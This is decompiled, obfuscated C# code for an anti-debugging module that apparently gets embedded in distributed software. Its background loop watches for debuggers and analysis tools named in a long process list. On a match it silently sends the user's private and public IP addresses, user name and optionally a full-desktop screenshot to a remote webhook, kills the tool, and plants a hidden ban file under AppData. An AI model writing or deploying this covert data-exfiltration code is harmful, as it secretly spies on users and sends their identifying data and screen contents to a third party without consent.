using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace U
{
	internal class T
	{
		private struct gt
		{
			public int gu;

			public int gv;

			public int gw;

			public int gx;
		}

		private static void Init()
		{
			Thread thread = new Thread((ThreadStart)delegate
			{
				DoWork();
			});
			thread.IsBackground = true;
			thread.Start();
		}

		public static void SendMessage(string url, string data)
		{
			WebRequest webRequest = WebRequest.Create(url);
			webRequest.Method = "POST";
			byte[] bytes = Encoding.UTF8.GetBytes(data);
			webRequest.ContentType = "application/json";
			webRequest.ContentLength = bytes.Length;
			Stream requestStream = webRequest.GetRequestStream();
			requestStream.Write(bytes, 0, bytes.Length);
			requestStream.Close();
			WebResponse response = webRequest.GetResponse();
			Stream responseStream = response.GetResponseStream();
			new StreamReader(responseStream).Close();
			responseStream.Close();
			response.Close();
		}

		[DllImport("user32.dll")]
		private static extern IntPtr GetForegroundWindow();

		[DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
		public static extern IntPtr GetDesktopWindow();

		[DllImport("user32.dll")]
		private static extern IntPtr GetWindowRect(IntPtr hWnd, ref gt rect);

		public static Image Y()
		{
			return aa(GetDesktopWindow());
		}

		public static Bitmap Z()
		{
			return aa(GetForegroundWindow());
		}

		public static Bitmap aa(IntPtr handle)
		{
			gt rect = default(gt);
			GetWindowRect(handle, ref rect);
			Rectangle rectangle = new Rectangle(rect.gu, rect.gv, rect.gw - rect.gu, rect.gx - rect.gv);
			Bitmap bitmap = new Bitmap(rectangle.Width, rectangle.Height);
			using (Graphics graphics = Graphics.FromImage(bitmap))
			{
				graphics.CopyFromScreen(new Point(rectangle.Left, rectangle.Top), Point.Empty, rectangle.Size);
				return bitmap;
			}
		}

		public static void ab(string webhookUrl, string filePath)
		{
			//IL_0000: Unknown result type (might be due to invalid IL or missing references)
			//IL_0005: Unknown result type (might be due to invalid IL or missing references)
			//IL_000b: Expected O, but got Unknown
			//IL_0018: Unknown result type (might be due to invalid IL or missing references)
			//IL_0029: Expected O, but got Unknown
			//IL_0029: Unknown result type (might be due to invalid IL or missing references)
			HttpClient val = new HttpClient();
			MultipartFormDataContent val2 = new MultipartFormDataContent();
			byte[] array = File.ReadAllBytes(filePath);
			val2.Add((HttpContent)new ByteArrayContent(array, 0, array.Length), Path.GetExtension(filePath), filePath);
			val.PostAsync(webhookUrl, (HttpContent)(object)val2).Wait();
			((HttpMessageInvoker)val).Dispose();
		}

		public static void DoWork()
		{
			while (true)
			{
				string str = MutationClass.Str2;
				string str2 = MutationClass.Str3;
				string str3 = MutationClass.Str4;
				string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
				if (File.Exists(folderPath + "\\Microsoft\\IVM.note"))
				{
					File.WriteAllBytes(Directory.GetCurrentDirectory() + "\\You are banned !", new byte[1]);
					Environment.Exit(0);
				}
				string[] array = new string[56]
				{
					"CosMos", "SimpleAssemblyExplorer", "StringDecryptor", "CodeCracker", "x32dbg", "x64dbg", "ollydbg", "simpleassembly", "httpanalyzer", "httpdebug",
					"fiddler", "processhacker", "scylla_x86", "scylla_x64", "scylla", "IMMUNITYDEBUGGER", "MegaDumper", "reshacker", "cheat engine", "solarwinds",
					"HTTPDebuggerSvc", "netcheat", "megadumper", "ilspy", "reflector", "exeinfope", "DetectItEasy", "Exeinfo PE", "Process Hacker", "HTTP Debugger",
					"dnSpy", "Fiddler Everywhere", "ExtremeDumper", "KsDumper", "ollydbg", "HxD", "dumper", "Progress Telerik Fiddler Web Debugger", "dnSpy-x86", "cheat engine",
					"Cheat Engine", "cheatengine", "cheatengine-x86_64", "HTTPDebuggerUI", "ProcessHacker", "x32dbg", "x64dbg", "DotNetDataCollector32", "DotNetDataCollector64", "CFF Explorer",
					"M*3*G*4**D*u*m*p*3*R*", "ĘẍtŗęḿęĎựḿҏęŗ", "solarwinds", "HTTPDebuggerSvc", "HTTPDebuggerUI", "netcheat"
				};
				Process[] processes = Process.GetProcesses();
				foreach (Process process in processes)
				{
					string[] array2 = array;
					foreach (string text in array2)
					{
						if (!process.ProcessName.ToLower().Contains(text.ToLower()))
						{
							continue;
						}
						string text2 = "easyanticheat";
						string text3 = "eac";
						if (process.ProcessName.ToLower().Contains(text2.ToLower()) || process.ProcessName.ToLower().Contains(text3.ToLower()))
						{
							return;
						}
						try
						{
							if (str == "0")
							{
								ServicePointManager.Expect100Continue = true;
								ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
								string userName = Environment.UserName;
								string text4 = Dns.GetHostEntry(Dns.GetHostName()).AddressList[0].ToString();
								string text5 = new WebClient
								{
									Proxy = null
								}.DownloadString("https://api.ipify.org/?format=text");
								string data = string.Concat("{\"content\":null,\"embeds\":[{\"title\":\"> Detected a Cracker, who wants to crack your program !\",\"description\":\" > Private IP : " + text4 + "\\n > Public IP : " + text5, "", "\\n > Computer name : " + userName + "\\n> Used tool : " + process.ProcessName, "\",\"color\":0,\"footer\":{\"text\":\"", " \"},\"thumbnail\":{\"url\":\"\"}}]}");
								SendMessage(MutationClass.Str1, data);
								if (str2 == "1")
								{
									Y().Save(str3);
									ab(MutationClass.Str1, str3);
								}
								process.Kill();
								Environment.Exit(0);
							}
							else if (str == "1")
							{
								ServicePointManager.Expect100Continue = true;
								ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
								string userName2 = Environment.UserName;
								string text6 = Dns.GetHostEntry(Dns.GetHostName()).AddressList[0].ToString();
								string text7 = new WebClient
								{
									Proxy = null
								}.DownloadString("https://api.ipify.org/?format=text");
								string data2 = string.Concat("{\"content\":null,\"embeds\":[{\"title\":\"> Detected a Cracker, who wants to crack your program !\",\"description\":\" > Private IP : " + text6 + "\\n > Public IP : " + text7, "", "\\n > Computer name : " + userName2 + "\\n> Used tool : " + process.ProcessName, "\",\"color\":0,\"footer\":{\"text\":\"", " \"},\"thumbnail\":{\"url\":\"\"}}]}");
								File.WriteAllText(folderPath + "\\Microsoft\\IVM.note", "");
								new FileInfo(folderPath + "\\Microsoft\\IVM.note").Attributes = FileAttributes.Hidden;
								SendMessage(MutationClass.Str1, data2);
								if (str2 == "1")
								{
									Y().Save(str3);
									ab(MutationClass.Str1, str3);
								}
								process.Kill();
								Environment.Exit(0);
							}
						}
						catch
						{
							process.CloseMainWindow();
							Environment.Exit(0);
							Environment.FailFast("");
						}
					}
				}
				Thread.Sleep(3000);
			}
		}
	}
}
